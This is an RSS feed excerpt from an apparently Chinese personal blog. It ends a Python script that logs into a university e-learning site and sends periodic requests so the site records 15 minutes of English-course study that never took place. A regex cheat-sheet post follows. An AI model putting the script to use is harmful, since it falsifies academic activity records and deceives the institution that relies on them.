        <span class="s2">&#34;Referer&#34;</span><span class="p">:</span> <span class="s2">&#34;http://202.194.7.18/NPlearning/studentdefault.aspx&#34;</span><span class="p">,</span>
        <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;application/x-www-form-urlencoded&#34;</span><span class="p">,</span>
        <span class="s2">&#34;X-Requested-With&#34;</span><span class="p">:</span> <span class="s2">&#34;XMLHttpRequest&#34;</span><span class="p">,</span>
    <span class="p">}</span>
    <span class="n">servertime</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">timeurl</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">servertime</span><span class="o">.</span><span class="n">text</span>


<span class="c1"># 4.开始记录时间</span>
<span class="k">def</span> <span class="nf">startNewStatTime</span><span class="p">(</span><span class="n">book</span><span class="p">,</span><span class="n">unit</span><span class="p">):</span>
    <span class="n">data</span> <span class="o">=</span> <span class="s2">&#34;logType=startnewstattime&amp;stattype=1&amp;material=&#34;</span><span class="o">+</span><span class="s2">&#34;College_English_NEW_SecEdition_Integrated_3&amp;unit=unit_0&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">unit</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;&amp;class=2017-0002-0033&amp;nocache=&#34;</span><span class="o">+</span><span class="n">randomnocache</span><span class="p">()</span>
    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s2">&#34;Accept&#34;</span><span class="p">:</span> <span class="s2">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#34;</span><span class="p">,</span>
        <span class="s2">&#34;Accept-Language&#34;</span><span class="p">:</span> <span class="s2">&#34;zh-CN,en-US;q=0.7,en;q=0.3&#34;</span><span class="p">,</span>
        <span class="s2">&#34;Referer&#34;</span><span class="p">:</span> <span class="s2">&#34;http://202.194.7.18/NPlearning/studentdefault.aspx&#34;</span><span class="p">,</span>
        <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;application/x-www-form-urlencoded&#34;</span><span class="p">,</span>
    <span class="p">}</span>
    <span class="c1"># 添加了cookies</span>
    <span class="n">c</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">RequestsCookieJar</span><span class="p">()</span>  <span class="c1"># 定义一个cookie对象</span>
    <span class="n">c</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="s1">&#39;StudyStart&#39;</span><span class="p">,</span> <span class="n">getServerTime</span><span class="p">())</span>  <span class="c1"># 增加cookie的值</span>
    <span class="n">s</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>  <span class="c1"># 更新s的cookie</span>
    <span class="n">c</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="s1">&#39;Material&#39;</span><span class="p">,</span> <span class="s1">&#39;College_English_NEW_SecEdition_Integrated_3&#39;</span><span class="p">)</span>  <span class="c1"># 增加cookie的值</span>
    <span class="n">s</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>  <span class="c1"># 更新s的cookie</span>
    <span class="n">c</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="s1">&#39;Unit&#39;</span><span class="p">,</span> <span class="s2">&#34;Unit_0&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">unit</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;&amp;nocache=&#34;</span><span class="o">+</span><span class="n">randomnocache</span><span class="p">())</span>  <span class="c1"># 增加cookie的值</span>
    <span class="n">s</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>  <span class="c1"># 更新s的cookie</span>
    <span class="n">c</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="s1">&#39;ClassNo&#39;</span><span class="p">,</span> <span class="s1">&#39;2017-0002-0033&#39;</span><span class="p">)</span>  <span class="c1"># 增加cookie的值</span>
    <span class="n">s</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>  <span class="c1"># 更新s的cookie</span>
    <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">timeurl</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>



<span class="c1"># 5.更新记录时间</span>
<span class="k">def</span> <span class="nf">updateStatTime</span><span class="p">():</span>
    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s2">&#34;Accept&#34;</span><span class="p">:</span> <span class="s2">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#34;</span><span class="p">,</span>
        <span class="s2">&#34;Accept-Language&#34;</span><span class="p">:</span> <span class="s2">&#34;zh-CN,en-US;q=0.7,en;q=0.3&#34;</span><span class="p">,</span>
        <span class="s2">&#34;Referer&#34;</span><span class="p">:</span> <span class="s2">&#34;http://202.194.7.18/NPlearning/studentdefault.aspx&#34;</span><span class="p">,</span>
        <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;application/x-www-form-urlencoded&#34;</span><span class="p">,</span>
    <span class="p">}</span>
    <span class="n">data</span> <span class="o">=</span> <span class="s2">&#34;logType=updatestattime&#34;</span> <span class="o">+</span> <span class="s2">&#34;&amp;nocache=&#34;</span> <span class="o">+</span> <span class="n">randomnocache</span><span class="p">()</span>
    <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">timeurl</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
    <span class="n">data</span> <span class="o">=</span> <span class="s2">&#34;logType=gettoken&amp;nocache=&#34;</span><span class="o">+</span><span class="n">randomnocache</span><span class="p">()</span>
    <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">timeurl</span><span class="p">,</span><span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>

<span class="c1"># 6.结束记录时间</span>
<span class="k">def</span> <span class="nf">endStatTime</span><span class="p">():</span>
    <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">timeurl</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="s2">&#34;logType=endstattime&#34;</span> <span class="o">+</span> <span class="s2">&#34;&amp;nocache=&#34;</span> <span class="o">+</span> <span class="n">randomnocache</span><span class="p">())</span>


<span class="c1">#时间循环1分钟更新一下时间</span>
<span class="k">def</span> <span class="nf">oneMin</span><span class="p">(</span><span class="n">tim</span><span class="p">):</span>
    <span class="nb">min</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
        <span class="n">updateStatTime</span><span class="p">()</span>
        <span class="k">print</span><span class="p">(</span><span class="s2">&#34;更新&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="nb">min</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;分钟&#34;</span><span class="p">)</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">min</span><span class="o">&gt;</span><span class="n">tim</span><span class="p">):</span>
            <span class="k">print</span><span class="p">(</span><span class="s2">&#34;结束&#34;</span><span class="p">)</span>
            <span class="n">endStatTime</span><span class="p">()</span>
            <span class="k">break</span>
        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">60</span><span class="p">)</span>
        <span class="nb">min</span> <span class="o">+=</span> <span class="mi">1</span>

<span class="n">login</span><span class="p">(</span><span class="s2">&#34;2017********&#34;</span><span class="p">,</span><span class="s2">&#34;*********&#34;</span><span class="p">)</span>
<span class="n">couseStudy</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
<span class="n">checkauthorize</span><span class="p">()</span>
<span class="n">getcomment</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
<span class="n">startNewStatTime</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
<span class="n">oneMin</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><blockquote>
<p>大二上学期写的，质量不高，轻喷</p>
</blockquote>
]]></description></item><item><title>简单正则表达式使用</title><link>https://lgf.im/posts/learn/simple-regular-expression-use/</link><pubDate>Sun, 14 Oct 2018 17:49:06 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/learn/simple-regular-expression-use/</guid><description><![CDATA[<p>这里做一个笔记，整理了各大网站里关于正则表达式的知识，以备后面查询。
主要涉及两个方面：</p>
<ol>
<li>正则表达式书写规则</li>
<li>常用正则表达式</li>
</ol>
<h2 id="正则表达式简单用法">正则表达式简单用法</h2>
<p>常用元字符</p>
<table>
<thead>
<tr>
<th style="text-align:left">代码</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">.</td>
<td style="text-align:left">匹配除换行符以外的任意字符</td>
</tr>
<tr>
<td style="text-align:left">\w</td>
<td style="text-align:left">匹配字母或数字或下划线</td>
</tr>
<tr>
<td style="text-align:left">\s</td>
<td style="text-align:left">匹配任意的空白符</td>
</tr>
<tr>
<td style="text-align:left">\d</td>
<td style="text-align:left">匹配数字</td>
</tr>
<tr>
<td style="text-align:left">\b</td>
<td style="text-align:left">匹配单词的开始或结束</td>
</tr>
<tr>
<td style="text-align:left">^</td>
<td style="text-align:left">匹配字符串的开始</td>
</tr>
<tr>
<td style="text-align:left">$</td>
<td style="text-align:left">匹配字符串的结束</td>
</tr>
</tbody>
</table>
<p>常用限定符</p>
<table>
<thead>
<tr>
<th style="text-align:left">代码/语法</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">*</td>
<td style="text-align:left">重复零次或更多次</td>
</tr>
<tr>
<td style="text-align:left">+</td>
<td style="text-align:left">重复一次或更多次</td>
</tr>
<tr>
<td style="text-align:left">?</td>
<td style="text-align:left">重复零次或一次</td>
</tr>
<tr>
<td style="text-align:left">{n}</td>
<td style="text-align:left">重复n次</td>
</tr>
<tr>
<td style="text-align:left">{n,}</td>
<td style="text-align:left">重复n次或更多次</td>
</tr>
<tr>
<td style="text-align:left">{n,m}</td>
<td style="text-align:left">重复n到m次</td>
</tr>
</tbody>
</table>
<p>常用反义词</p>
<table>
<thead>
<tr>
<th style="text-align:left">代码/语法</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">\W</td>
<td style="text-align:left">匹配任意不是字母，数字，下划线，汉字的字符</td>
</tr>
<tr>
<td style="text-align:left">\S</td>
<td style="text-align:left">匹配任意不是空白符的字符</td>
</tr>
<tr>
<td style="text-align:left">\D</td>
<td style="text-align:left">匹配任意非数字的字符</td>
</tr>
<tr>
<td style="text-align:left">\B</td>
<td style="text-align:left">匹配不是单词开头或结束的位置</td>
</tr>
<tr>
<td style="text-align:left">[^x]</td>
<td style="text-align:left">匹配除了x以外的任意字符</td>
</tr>
<tr>
<td style="text-align:left">[^aeiou]</td>
<td style="text-align:left">匹配除了aeiou这几个字母以外的任意字符</td>
</tr>
</tbody>
</table>
<!-- 
## 常用正则表达式

<div>
		<h2>一、校验数字的表达式</h2>
<ul>
<li>数字：<strong>^[0-9]*$</strong></li>
<li> n位的数字：<strong>^\d{n}$</strong></li>
<li> 至少n位的数字<strong>：^\d{n,}$</strong></li>
<li> m-n位的数字：<strong>^\d{m,n}$</strong></li>
<li> 零和非零开头的数字：<strong>^(0 | [1-9][0-9]*)$</strong></li>
<li> 非零开头的最多带两位小数的数字：<strong>^([1-9][0-9]*)+(\.[0-9]{1,2})?$</strong></li>
<li> 带1-2位小数的正数或负数：<strong>^(\-)?\d+(\.\d{1,2})$</strong></li>
<li> 正数、负数、和小数：<strong>^(\- | \+)?\d+(\.\d+)?$</strong></li>
<li> 有两位小数的正实数：<strong>^[0-9]+(\.[0-9]{2})?$</strong></li>
<li> 有1~3位小数的正实数：<strong>^[0-9]+(\.[0-9]{1,3})?$</strong></li>
<li> 非零的正整数：<strong>^[1-9]\d*$ 或 ^([1-9][0-9]*){1,3}$ 或 ^\+?[1-9][0-9]*$</strong></li>
<li> 非零的负整数：<strong>^\-[1-9][]0-9"*$ 或 ^-[1-9]\d*$</strong></li>
<li> 非负整数：<strong>^\d+$ 或 ^[1-9]\d* | 0$</strong></li>
<li> 非正整数：<strong>^-[1-9]\d* | 0$ 或 ^((-\d+) | (0+))$</strong></li>
<li> 非负浮点数：<strong>^\d+(\.\d+)?$ 或 ^[1-9]\d*\.\d* | 0\.\d*[1-9]\d* | 0?\.0+ | 0$</strong></li>
<li> 非正浮点数：<strong>^((-\d+(\.\d+)?) | (0+(\.0+)?))$ 或 ^(-([1-9]\d*\.\d* | 0\.\d*[1-9]\d*)) | 0?\.0+ | 0$</strong></li>
<li> 正浮点数：<strong>^[1-9]\d*\.\d* | 0\.\d*[1-9]\d*$ 或 ^(([0-9]+\.[0-9]*[1-9][0-9]*) | ([0-9]*[1-9][0-9]*\.[0-9]+) | ([0-9]*[1-9][0-9]*))$</strong></li>
<li> 负浮点数：<strong>^-([1-9]\d*\.\d* | 0\.\d*[1-9]\d*)$ 或 ^(-(([0-9]+\.[0-9]*[1-9][0-9]*) | ([0-9]*[1-9][0-9]*\.[0-9]+) | ([0-9]*[1-9][0-9]*)))$</strong></li>
<li> 浮点数：<strong>^(-?\d+)(\.\d+)?$ 或 ^-?([1-9]\d*\.\d* | 0\.\d*[1-9]\d* | 0?\.0+ | 0)$</strong></li></ul>

<hr>
<h2>二、校验字符的表达式</h2>
<ul>
<li>汉字：<strong>^[\u4e00-\u9fa5]{0,}$</strong></li>
<li>英文和数字：<strong>^[A-Za-z0-9]+$ 或 ^[A-Za-z0-9]{4,40}$</strong></li>
<li>长度为3-20的所有字符：<strong>^.{3,20}$</strong></li>
<li>由26个英文字母组成的字符串：<strong>^[A-Za-z]+$</strong></li>
<li>由26个大写英文字母组成的字符串：<strong>^[A-Z]+$</strong></li>
<li>由26个小写英文字母组成的字符串：<strong>^[a-z]+$</strong></li>
<li>由数字和26个英文字母组成的字符串：<strong>^[A-Za-z0-9]+$</strong></li>
<li>由数字、26个英文字母或者下划线组成的字符串：<strong>^\w+$ 或 ^\w{3,20}$</strong></li>
<li>中文、英文、数字包括下划线：<strong>^[\u4E00-\u9FA5A-Za-z0-9_]+$</strong></li>
<li>中文、英文、数字但不包括下划线等符号：<strong>^[\u4E00-\u9FA5A-Za-z0-9]+$ 或 ^[\u4E00-\u9FA5A-Za-z0-9]{2,20}$</strong></li>
<li>可以输入含有^%&',;=?$\"等字符：<strong>[^%&',;=?$\x22]+</strong></li>
<li>禁止输入含有~的字符：<strong>[^~\x22]+</strong></li></ul>

<hr>
<h2>三、特殊需求表达式</h2>
<ul>
<li>Email地址：<strong>^\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*$</strong></li>
<li>域名：<strong>[a-zA-Z0-9][-a-zA-Z0-9]{0,62}(/.[a-zA-Z0-9][-a-zA-Z0-9]{0,62})+/.?</strong></li>
<li>InternetURL：<strong>[a-zA-z]+://[^\s]* 或 ^http://([\w-]+\.)+[\w-]+(/[\w-./?%&=]*)?$</strong></li>
<li>手机号码：<strong>^(13[0-9] | 14[5 | 7] | 15[0 | 1 | 2 | 3 | 5 | 6 | 7 | 8 | 9] | 18[0 | 1 | 2 | 3 | 5 | 6 | 7 | 8 | 9])\d{8}$</strong></li>
<li>电话号码("XXX-XXXXXXX"、"XXXX-XXXXXXXX"、"XXX-XXXXXXX"、"XXX-XXXXXXXX"、"XXXXXXX"和"XXXXXXXX)：<strong>^(\(\d{3,4}-) | \d{3.4}-)?\d{7,8}$ </strong></li>
<li>国内电话号码(0511-4405222、021-87888822)：<strong>\d{3}-\d{8} | \d{4}-\d{7}</strong></li>
<li>电话号码正则表达式（支持手机号码，3-4位区号，7-8位直播号码，1－4位分机号）: <strong>((\d{11}) | ^((\d{7,8}) | (\d{4} | \d{3})-(\d{7,8}) | (\d{4} | \d{3})-(\d{7,8})-(\d{4} | \d{3} | \d{2} | \d{1}) | (\d{7,8})-(\d{4} | \d{3} | \d{2} | \d{1}))$)</strong></li>
<li>身份证号(15位、18位数字)，最后一位是校验位，可能为数字或字符X：<strong>(^\d{15}$) | (^\d{18}$) | (^\d{17}(\d | X | x)$)</strong></li>
<li>帐号是否合法(字母开头，允许5-16字节，允许字母数字下划线)：<strong>^[a-zA-Z][a-zA-Z0-9_]{4,15}$</strong></li>
<li>密码(以字母开头，长度在6~18之间，只能包含字母、数字和下划线)：<strong>^[a-zA-Z]\w{5,17}$</strong></li>
<li>强密码(必须包含大小写字母和数字的组合，不能使用特殊字符，长度在 8-10 之间)：<strong>^(?=.*\d)(?=.*[a-z])(?=.*[A-Z])[a-zA-Z0-9]{8,10}$  </strong></li>
<li>强密码(必须包含大小写字母和数字的组合，可以使用特殊字符，长度在8-10之间)：<strong>^(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,10}$  </strong></li>
<li>日期格式：<strong>^\d{4}-\d{1,2}-\d{1,2}</strong></li>
<li>一年的12个月(01～09和1～12)：<strong>^(0?[1-9] | 1[0-2])$</strong></li>
<li>一个月的31天(01～09和1～31)：<strong>^((0?[1-9]) | ((1 | 2)[0-9]) | 30 | 31)$ </strong></li>
<li>钱的输入格式：<ol>
<li>    有四种钱的表示形式我们可以接受:"10000.00" 和 "10,000.00", 和没有 "分" 的 "10000" 和 "10,000"：<strong>^[1-9][0-9]*$ </strong></li>
<li>    这表示任意一个不以0开头的数字,但是,这也意味着一个字符"0"不通过,所以我们采用下面的形式：<strong>^(0 | [1-9][0-9]*)$ </strong></li>
<li>    一个0或者一个不以0开头的数字.我们还可以允许开头有一个负号：<strong>^(0 | -?[1-9][0-9]*)$ </strong></li>
<li>    这表示一个0或者一个可能为负的开头不为0的数字.让用户以0开头好了.把负号的也去掉,因为钱总不能是负的吧。下面我们要加的是说明可能的小数部分：<strong>^[0-9]+(.[0-9]+)?$ </strong></li>
<li>    必须说明的是,小数点后面至少应该有1位数,所以"10."是不通过的,但是 "10" 和 "10.2" 是通过的：<strong>^[0-9]+(.[0-9]{2})?$ </strong></li>
<li>    这样我们规定小数点后面必须有两位,如果你认为太苛刻了,可以这样：<strong>^[0-9]+(.[0-9]{1,2})?$ </strong></li>
<li>    这样就允许用户只写一位小数.下面我们该考虑数字中的逗号了,我们可以这样：<strong>^[0-9]{1,3}(,[0-9]{3})*(.[0-9]{1,2})?$ </strong></li>
<li>    1到3个数字,后面跟着任意个 逗号+3个数字,逗号成为可选,而不是必须：<strong>^([0-9]+ | [0-9]{1,3}(,[0-9]{3})*)(.[0-9]{1,2})?$ </strong></li>
<li>    备注：这就是最终结果了,别忘了"+"可以用"*"替代如果你觉得空字符串也可以接受的话(奇怪,为什么?)最后,别忘了在用函数时去掉去掉那个反斜杠,一般的错误都在这里</li></ol></li>
<li>xml文件：<strong>^([a-zA-Z]+-?)+[a-zA-Z0-9]+\\.[x | X][m | M][l | L]$</strong></li>
<li>中文字符的正则表达式：<strong>[\u4e00-\u9fa5]</strong></li>
<li>双字节字符：<strong>[^\x00-\xff]    (包括汉字在内，可以用来计算字符串的长度(一个双字节字符长度计2，ASCII字符计1))</strong></li>
<li>空白行的正则表达式：<strong>\n\s*\r    (可以用来删除空白行)</strong></li>
<li>HTML标记的正则表达式：<strong><(\S*?)[^>]*>.*?</\1> | <.*? />    (首尾空白字符的正则表达式：^\s* | \s*$或(^\s*) | (\s*$)    (可以用来删除行首行尾的空白字符(包括空格、制表符、换页符等等)，非常有用的表达式)</strong></li>
<li>腾讯QQ号：<strong>[1-9][0-9]{4,}    (腾讯QQ号从10000开始)</strong></li>
<li>中国邮政编码：<strong>[1-9]\d{5}(?!\d)    (中国邮政编码为6位数字)</strong></li>
<li>IP地址：<strong>((?:(?:25[0-5] | 2[0-4]\\d | [01]?\\d?\\d)\\.){3}(?:25[0-5] | 2[0-4]\\d | [01]?\\d?\\d)) </strong></li></ul>
</div>-->
<h2 id="正则表达式学习网站">正则表达式学习网站</h2>
<p><a href="http://tool.chinaz.com/regex/" target="_blank" rel="noopener noreffer">正则表达式在线测试-站长工具</a>
<a href="https://c.runoob.com/front-end/854" target="_blank" rel="noopener noreffer">正则表达式在线测试-菜鸟工具</a>
<a href="http://www.runoob.com/regexp/regexp-syntax.html" target="_blank" rel="noopener noreffer">正则表达式教程-菜鸟教程</a></p>]]></description></item></channel></rss>